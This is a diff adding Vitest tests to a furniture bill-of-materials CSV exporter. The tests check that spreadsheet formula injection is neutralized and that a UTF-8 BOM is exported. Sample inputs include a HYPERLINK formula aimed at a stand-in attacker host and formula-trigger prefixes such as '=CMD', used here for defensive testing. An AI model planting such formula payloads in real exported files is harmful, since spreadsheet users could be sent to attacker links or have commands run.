@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest';
 import { computeBOM } from './bom';
-import { csvHeaders, toCSV } from './csv';
+import { csvHeaders, toCSV, CSV_BOM } from './csv';
 import type { BomRow, CustomPart } from './types';
 
 const row = (overrides: Partial<BomRow> = {}): BomRow => ({
@@ -83,5 +83,45 @@ describe('toCSV', () => {
       defaultHardwareFinishId: 'matte-black',
     });
     expect(toCSV(bom.rows, 'mm').split('\r\n').slice(1)).toHaveLength(bom.rows.length);
+  });
+});
+
+describe('spreadsheet formula neutralization (BUG-011)', () => {
+  /** The Part column of the single data row. Splitting on ',' would break on a
+   *  quoted label that contains one, so the row is read after the Type field. */
+  const cell = (label: string) => {
+    const line = toCSV([row({ label })], 'mm').split('\r\n')[1]!;
+    return line.slice('Sheet Good,'.length, line.lastIndexOf(',1,Oak,'));
+  };
+
+  it('defuses a label that opens with a formula trigger', () => {
+    expect(cell('=HYPERLINK("http://evil.example","Shelf")'))
+      .toBe(`"'=HYPERLINK(""http://evil.example"",""Shelf"")"`);
+  });
+
+  it('covers every trigger a spreadsheet acts on', () => {
+    for (const prefix of ['=', '+', '-', '@']) {
+      expect(cell(`${prefix}CMD`)).toBe(`'${prefix}CMD`);
+    }
+    // A leading tab is stripped before the parser reads the first visible
+    // character, so it smuggles a formula through too. Tab is not a CSV
+    // delimiter, so the field still needs no quoting.
+    expect(cell('\tSUM(A1)')).toBe("'\tSUM(A1)");
+  });
+
+  it('leaves an ordinary label untouched', () => {
+    expect(cell('Base 600 Shelf')).toBe('Base 600 Shelf');
+    expect(cell('Shelf (600mm)')).toBe('Shelf (600mm)');
+  });
+
+  it('never prefixes a numeric field, so measurements stay computable', () => {
+    const line = toCSV([row({ w: 800, h: 18, d: 300 })], 'mm').split('\r\n')[1]!;
+    expect(line.split(',').slice(4, 7)).toEqual(['800', '18', '300']);
+  });
+
+  it('exports a UTF-8 BOM so Excel decodes the em dash (BUG-013)', () => {
+    expect(CSV_BOM).toBe('﻿');
+    // The serializer itself stays pure; CutList prepends the mark.
+    expect(toCSV([row()], 'mm').startsWith(CSV_BOM)).toBe(false);
   });
 });
